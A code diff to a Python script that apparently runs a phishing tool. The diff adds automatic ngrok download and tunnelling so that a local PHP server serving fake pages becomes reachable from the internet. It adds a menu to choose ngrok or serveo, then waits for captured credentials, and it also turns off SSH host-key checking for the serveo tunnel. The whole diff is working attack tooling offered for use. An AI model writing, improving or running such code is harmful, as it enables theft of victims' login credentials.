@@ -14,6 +14,7 @@ from platform import system as systemos, architecture
 from wget import download
 import re
 import json
+from subprocess import check_output
 
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -33,7 +34,25 @@ if connected() == False:
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
 '''.format(RED, END))
      exit(0)
-
+    
+def checkNgrok():
+    if path.isfile('Server/ngrok') == False: 
+        print('[*] Downloading Ngrok...')
+        if 'Android' in str(check_output(('uname', '-a'))):
+            filename = 'ngrok-stable-linux-arm.zip'
+        else:
+            ostype = systemos().lower()
+            if architecture()[0] == '64bit':
+                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
+            else:
+                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
+        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
+        download(url)
+        system('unzip ' + filename)
+        system('mv ngrok Server/ngrok')
+        system('rm -Rf ' + filename)
+        system('clear')
+checkNgrok()
 
 def end():
     system('clear')
@@ -265,7 +284,7 @@ def runPEnv():
 
     
 def serveo():
-    system('ssh -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
     sleep(4)
     f = open('sendlink.txt', 'r')
     a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
@@ -285,9 +304,16 @@ def serveo():
     url.close()
     system('rm sendlink.txt')    
 
-
+def runNgrok():
+    system('./Server/ngrok http 1111 > /dev/null &')
+    sleep(10)
+    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+    url = open('ngrok.url', 'r')
+    print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
+    url.close()
+    
+    
 def runServer():
-
     system("cd Server/www/ && php -n -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
     
@@ -298,7 +324,15 @@ def runServer():
 if __name__ == "__main__":
     try:
         runPEnv()
-        serveo() 
+        def server():
+                print("\n Server you want to use".format(CYAN, END))
+                print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, END))
+                choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+                if choice == '1':
+                	runNgrok()
+                else:
+                	serveo()
+        server()
         multiprocessing.Process(target=runServer).start()
         waitCreds()
 
@@ -310,5 +344,7 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:        
         system('pkill -f ssh')
+        system('pkill -f php')
+        system('pkill -f ngrok')
         end()
         exit(0)
